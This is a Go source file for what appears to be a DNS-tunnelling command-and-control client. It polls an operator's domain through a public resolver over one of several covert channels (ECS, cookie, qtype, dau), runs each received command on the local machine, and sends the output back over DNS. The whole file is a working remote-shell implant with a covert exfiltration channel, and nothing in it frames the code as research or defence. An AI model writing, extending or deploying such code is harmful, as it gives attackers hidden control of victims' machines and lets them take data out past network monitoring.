package main

import (
	"errors"
	"flag"
	"fmt"
	"os/exec"
	"strings"
	"time"

	"github.com/kek/pek/internal/protocol"
)

func executeCmd(command string) ([]byte, error) {
	args := strings.Fields(command)
	cmd := exec.Command(args[0], args[1:]...)

	if errors.Is(cmd.Err, exec.ErrDot) {
		cmd.Err = nil
	}

	result, err := cmd.Output()
	if err != nil {
		return []byte(err.Error()), nil
	}

	return result, nil
}

func main() {
	domain := flag.String("domain", "", "server domain")
	resolver := flag.String("resolver", "8.8.8.8", "resolver to use")
	method := flag.String("method", "ecs", "channel type [ecs, cookie, qtype, dau]")
	interval := flag.Int("interval", 1000, "milliseconds between attempts to fetch a command from server")
	delay := flag.Int("delay", 200, "milliseconds between requests for data transfer")
	flag.Parse()

	if *domain == "" {
		fmt.Printf("-domain is missing")
		return
	}

	var proto protocol.ProtocolClient

	switch *method {
	case "ecs":
		proto = protocol.NewEcsProtoClient(*resolver, *domain, time.Duration(*delay)*time.Millisecond)
	case "cookie":
		proto = protocol.NewCookieProtoClient(*resolver, *domain, time.Duration(*delay)*time.Millisecond)
	case "qtype":
		proto = protocol.NewQtypeProtoClient(*resolver, *domain, time.Duration(*delay)*time.Millisecond)
	case "dau":
		proto = protocol.NewDauProtoClient(*resolver, *domain, time.Duration(*delay)*time.Millisecond)
	default:
		fmt.Printf("-method can only be one of [ecs, cookie, qtype, dau]")
		return
	}

	fmt.Printf("Polling")
	for {
		fmt.Printf(".")
		time.Sleep(time.Duration(*interval) * time.Millisecond)

		cmd, err := proto.FetchCmd()
		if err != nil {
			continue
		}

		if cmd != "" {
			fmt.Printf("OK\nExecuting command: %s ... ", cmd)
			cmdResult, err := executeCmd(cmd)
			if err != nil {
				continue
			}
			fmt.Printf("OK\n")

			proto.Send(cmdResult)
			fmt.Printf("Polling")
		}
	}
}
